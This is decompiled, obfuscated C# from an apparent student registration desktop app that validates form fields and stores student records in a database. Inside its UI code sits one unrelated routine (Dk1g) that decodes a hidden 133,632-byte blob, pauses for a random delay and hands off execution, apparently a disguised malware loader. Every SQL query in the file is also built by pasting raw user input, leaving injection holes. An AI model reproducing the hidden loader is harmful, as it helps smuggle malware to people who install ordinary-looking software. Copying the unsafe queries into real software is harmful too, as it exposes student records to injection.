using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nc3g;
using Nr7t;
using Ps0g;
using Rm59;
using f0NX;
using g2H;
using m1F4;
using m5LS;
using z5S;

namespace d2RH;

[StandardModule]
internal sealed class k6FD
{
	private static object e = true;

	private static DateTime timeof = DateAndTime.get_TimeOfDay();

	private static DateTime todayday = Conversions.ToDate(Strings.Format((object)"yyyy-mmm-dd", Conversions.ToString(DateAndTime.get_Today())));

	public static void Ae5z()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtSurname.get_Text(), "Enter Surname", false) == 0)
		{
			Gw5.Forms.Stundentform.txtSurname.set_Text("");
			((TextBoxBase)Gw5.Forms.Stundentform.txtSurname).set_ForeColor(Color.Black);
		}
	}

	public static void g7CF()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtSurname.get_Text(), "", false) == 0)
		{
			Gw5.Forms.Stundentform.txtSurname.set_Text("Enter Surname");
			((TextBoxBase)Gw5.Forms.Stundentform.txtSurname).set_ForeColor(Color.Gray);
		}
	}

	public static void Cs81()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtFname.get_Text(), "Enter Name", false) == 0)
		{
			Gw5.Forms.Stundentform.txtFname.set_Text("");
			((TextBoxBase)Gw5.Forms.Stundentform.txtFname).set_ForeColor(Color.Black);
		}
	}

	public static void Sn9p()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtFname.get_Text(), "", false) == 0)
		{
			Gw5.Forms.Stundentform.txtFname.set_Text("Enter Name");
			((TextBoxBase)Gw5.Forms.Stundentform.txtFname).set_ForeColor(Color.Gray);
		}
	}

	public static void Ag2k()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtNational.get_Text(), "Enter Nationality", false) == 0)
		{
			Gw5.Forms.Stundentform.txtNational.set_Text("");
			((TextBoxBase)Gw5.Forms.Stundentform.txtNational).set_ForeColor(Color.Black);
		}
	}

	public static void Hd7r()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtNational.get_Text(), "", false) == 0)
		{
			Gw5.Forms.Stundentform.txtNational.set_Text("Enter Nationality");
			((TextBoxBase)Gw5.Forms.Stundentform.txtNational).set_ForeColor(Color.Gray);
		}
	}

	public static void z9MX()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtGuid.get_Text(), "Enter Guidence", false) == 0)
		{
			Gw5.Forms.Stundentform.txtGuid.set_Text("");
			((TextBoxBase)Gw5.Forms.Stundentform.txtGuid).set_ForeColor(Color.Black);
		}
	}

	public static void Cb0a()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtGuid.get_Text(), "", false) == 0)
		{
			Gw5.Forms.Stundentform.txtGuid.set_Text("Enter Guidence");
			((TextBoxBase)Gw5.Forms.Stundentform.txtGuid).set_ForeColor(Color.Gray);
		}
	}

	public static void Nf8o()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtPhone.get_Text(), "Enter Phone Number", false) == 0)
		{
			Gw5.Forms.Stundentform.txtPhone.set_Text("");
			((TextBoxBase)Gw5.Forms.Stundentform.txtPhone).set_ForeColor(Color.Black);
		}
	}

	public static void En2g()
	{
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtPhone.get_Text(), "", false) == 0)
		{
			Gw5.Forms.Stundentform.txtPhone.set_Text("Enter Phone Number");
			((TextBoxBase)Gw5.Forms.Stundentform.txtPhone).set_ForeColor(Color.Gray);
		}
	}

	public static void c3P9()
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtFname.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Name is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtSurname.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Surname is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtAddress.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Address is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtNational.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Nationality is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtFname.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Guidance's name is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.txtPhone.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Phone Number is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.cmbClass.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please select class!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Gw5.Forms.Stundentform.cmbGender.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please select gender!", (MsgBoxStyle)0, (object)null);
			return;
		}
		g8H5.issucess = Zs8q.r3Z8("INSERT INTO `student_details` (`stid`, `name`, `surname`,`dateOfBirth`,  `gender`, `nationality`, `class`,  `address`, `guidanceName`, `phone`,`date_registered`)  VALUES ('" + Gw5.Forms.Stundentform.txtReg.get_Text() + "','" + Gw5.Forms.Stundentform.txtFname.get_Text() + "', '" + Gw5.Forms.Stundentform.txtSurname.get_Text() + "', '" + Conversions.ToString(Gw5.Forms.Stundentform.DOBPick.get_Value()) + "', '" + Gw5.Forms.Stundentform.cmbGender.get_Text() + "', '" + Gw5.Forms.Stundentform.txtNational.get_Text() + "',  '" + Gw5.Forms.Stundentform.cmbClass.get_Text() + "',  '" + Gw5.Forms.Stundentform.txtAddress.get_Text() + "','" + Gw5.Forms.Stundentform.txtGuid.get_Text() + "', '" + Gw5.Forms.Stundentform.txtPhone.get_Text() + "',  '" + Conversions.ToString(todayday) + "');");
		if (g8H5.issucess)
		{
			Interaction.MsgBox((object)"Student has been registered successfully!", (MsgBoxStyle)64, (object)null);
			((Control)Gw5.Forms.StudentList).Show();
			((Form)Gw5.Forms.StudentList).set_Location(new Point(433, 122));
			((Control)Gw5.Forms.Stundentform).Hide();
		}
		else
		{
			Interaction.MsgBox((object)"No student has been registered!", (MsgBoxStyle)16, (object)null);
		}
	}

	internal static void Dk1g()
	{
		byte[] array = g9A7.b3H2(133632);
		checked
		{
			int gt = Conversions.ToInteger(c2S.mDic[c2S.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = g2GB.y4L6(array[i], (byte[])c2S.mDic[c2S.sArray], gt, i);
			}
			c2S.mDic.Add(c2S.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Gs93.Zn82();
		}
	}

	public static void e9DW()
	{
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			x3HT.c6AD("SELECT Max(stid) From `student_details`  ");
			g8H5.con.Ye0f();
			int num = g8H5.cmd.ExecuteScalar;
			Gw5.Forms.Stundentform.txtReg.set_Text(Conversions.ToString(checked(num + 1)));
			if (Operators.CompareString(Gw5.Forms.Stundentform.txtReg.get_Text(), "", false) == 0)
			{
				Gw5.Forms.Stundentform.txtReg.set_Text("");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		g8H5.con.Ew4k();
	}

	public static void Cs95()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			x3HT.c6AD("SELECT stid,name,surname,dateOfBirth,gender,nationality,class,address,guidanceName,phone FROM student_details");
			Sg31.b6X0(Gw5.Forms.StudentList.StudentGridView, "studentList");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			g8H5.con.Ew4k();
			g8H5.da.f5F6();
		}
	}

	public static void y2W3()
	{
		Gw5.Forms.StudentList.txtReg.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(0)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.txtFname.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(1)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.txtSurname.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(2)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.DOBPick.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(3)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.cmbGender.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(4)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.txtNational.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(5)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.cmbClass.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(6)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.txtAddress.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(7)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.txtGuid.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(8)
			.get_Value()
			.ToString());
		Gw5.Forms.StudentList.txtPhone.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(9)
			.get_Value()
			.ToString());
	}

	public static void n9YN()
	{
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		g8H5.issucess = Zs8q.r3Z8("UPDATE `student_details` SET `name`='" + Gw5.Forms.StudentList.txtFname.get_Text() + "',`surname`= '" + Gw5.Forms.StudentList.txtSurname.get_Text() + "',`dateOfBirth`='" + Conversions.ToString(Gw5.Forms.StudentList.DOBPick.get_Value()) + "' ,`gender`= '" + Gw5.Forms.StudentList.cmbGender.get_Text() + "' ,`nationality`= '" + Gw5.Forms.StudentList.txtNational.get_Text() + "',`class`= '" + Gw5.Forms.StudentList.cmbClass.get_Text() + "',`address`= '" + Gw5.Forms.StudentList.txtAddress.get_Text() + "',`guidanceName`='" + Gw5.Forms.StudentList.txtGuid.get_Text() + "',`phone`='" + Gw5.Forms.StudentList.txtPhone.get_Text() + "' WHERE `stid`='" + Gw5.Forms.StudentList.txtReg.get_Text() + "'");
		if (g8H5.issucess)
		{
			Interaction.MsgBox((object)"Student has been Successfully!Updated a student", (MsgBoxStyle)64, (object)null);
			Cs95();
			Hg9a();
		}
		else
		{
			Interaction.MsgBox((object)"Error occured..................!!!", (MsgBoxStyle)16, (object)null);
		}
	}

	public static void Hg9a()
	{
		((TextBoxBase)Gw5.Forms.StudentList.txtReg).Clear();
		((TextBoxBase)Gw5.Forms.StudentList.txtFname).Clear();
		((TextBoxBase)Gw5.Forms.StudentList.txtSurname).Clear();
		((Control)Gw5.Forms.StudentList.DOBPick).ResetText();
		Gw5.Forms.StudentList.cmbGender.ResetText();
		((TextBoxBase)Gw5.Forms.StudentList.txtNational).Clear();
		Gw5.Forms.StudentList.cmbClass.ResetText();
		((TextBoxBase)Gw5.Forms.StudentList.txtAddress).Clear();
		((TextBoxBase)Gw5.Forms.StudentList.txtGuid).Clear();
		((TextBoxBase)Gw5.Forms.StudentList.txtPhone).Clear();
	}

	public static void r2SY()
	{
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			x3HT.c6AD("SELECT stid,name,surname,dateOfBirth,gender,nationality,class,address,guidanceName,phone FROM student_details WHERE class = '" + Gw5.Forms.StudentList.cmbFilterClass.get_Text() + "'");
			Sg31.b6X0(Gw5.Forms.StudentList.StudentGridView, "studentList");
			x3HT.c6AD("SELECT count(*) FROM `student_details`where class ='" + Gw5.Forms.StudentList.cmbFilterClass.get_Text() + "'");
			int num = Gs93.Hf89();
			Gw5.Forms.StudentList.lbTotal.set_Text(Conversions.ToString(num));
			((Control)Gw5.Forms.StudentList.Panel11).set_Visible(true);
			Gw5.Forms.StudentList.lblClassName.set_Text(Gw5.Forms.StudentList.cmbFilterClass.get_Text());
			if (Conversions.ToDouble(Gw5.Forms.StudentList.lbTotal.get_Text()) > 1.0)
			{
				Gw5.Forms.StudentList.lblDesicion.set_Text("ther are");
				Gw5.Forms.StudentList.LabelBelow.set_Text("Pupils in this Class");
				((Control)Gw5.Forms.StudentList.lbTotal).set_Visible(true);
				((Control)Gw5.Forms.StudentList.LabelBelow).set_Visible(true);
			}
			else if (Conversions.ToDouble(Gw5.Forms.StudentList.lbTotal.get_Text()) == 1.0)
			{
				Gw5.Forms.StudentList.lblDesicion.set_Text("there is");
				Gw5.Forms.StudentList.LabelBelow.set_Text("Pupil in this Class");
				((Control)Gw5.Forms.StudentList.lbTotal).set_Visible(true);
				((Control)Gw5.Forms.StudentList.LabelBelow).set_Visible(true);
			}
			else if (Conversions.ToDouble(Gw5.Forms.StudentList.lbTotal.get_Text()) == 0.0)
			{
				Gw5.Forms.StudentList.lblDesicion.set_Text("THE CLASS IS EMPTY");
				((Control)Gw5.Forms.StudentList.lbTotal).set_Visible(false);
				((Control)Gw5.Forms.StudentList.LabelBelow).set_Visible(false);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			g8H5.con.Ew4k();
			g8H5.da.f5F6();
		}
	}

	public static void Ht63()
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		g8H5.issucess = Zs8q.Hd09("DELETE FROM student_details  WHERE `stid`='" + Gw5.Forms.StudentList.txtReg.get_Text() + "'");
		if (g8H5.issucess)
		{
			Interaction.MsgBox((object)"Student has been Deleted successfully!", (MsgBoxStyle)64, (object)null);
			Cs95();
			Hg9a();
		}
		else
		{
			Interaction.MsgBox((object)"Error occured..................!!!", (MsgBoxStyle)16, (object)null);
		}
	}

	public static void Ty2s()
	{
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			x3HT.c6AD("SELECT * FROM `student_details` WHERE `stid`='" + Gw5.Forms.StudentList.txtSearch.get_Text() + "'");
			g8H5.con.Ye0f();
			g8H5.dReader = g8H5.cmd.ExecuteReader;
			while (g8H5.dReader.t4E8())
			{
				Gw5.Forms.StudentList.txtSearch.set_Text("");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			g8H5.con.Ew4k();
			g8H5.da.f5F6();
		}
	}

	public static void Cq80()
	{
		x3HT.c6AD("SELECT count(*) FROM `student_details`");
		int num = Gs93.Hf89();
		Gw5.Forms.StudentList.lblTotal.set_Text(Conversions.ToString(num));
	}

	public static void Hk7g()
	{
		x3HT.c6AD("SELECT count(*) FROM `student_details` where gender ='Female'");
		int num = Gs93.Hf89();
		Gw5.Forms.StudentList.lblTotalFemale.set_Text(Conversions.ToString(num));
	}

	public static void Cb1m()
	{
		x3HT.c6AD("SELECT count(*) FROM `student_details` where gender ='Male'");
		int num = Gs93.Hf89();
		Gw5.Forms.StudentList.lblTotalMale.set_Text(Conversions.ToString(num));
	}

	public static void k5Q4()
	{
		((Control)Gw5.Forms.Student_Profile).Show();
		((Form)Gw5.Forms.Student_Profile).set_Location(new Point(290, 114));
		((Control)Gw5.Forms.StudentList).Hide();
		Gw5.Forms.Student_Profile.lblReg.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(0)
			.get_Value()
			.ToString());
		Gw5.Forms.Student_Profile.lblFname.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(1)
			.get_Value()
			.ToString());
		Gw5.Forms.Student_Profile.lblSurn.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(2)
			.get_Value()
			.ToString());
		Gw5.Forms.Student_Profile.lblGnder.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(4)
			.get_Value()
			.ToString());
		Gw5.Forms.Student_Profile.lblClass.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(6)
			.get_Value()
			.ToString());
		Gw5.Forms.Student_Profile.lblphone.set_Text(Gw5.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(9)
			.get_Value()
			.ToString());
	}
}
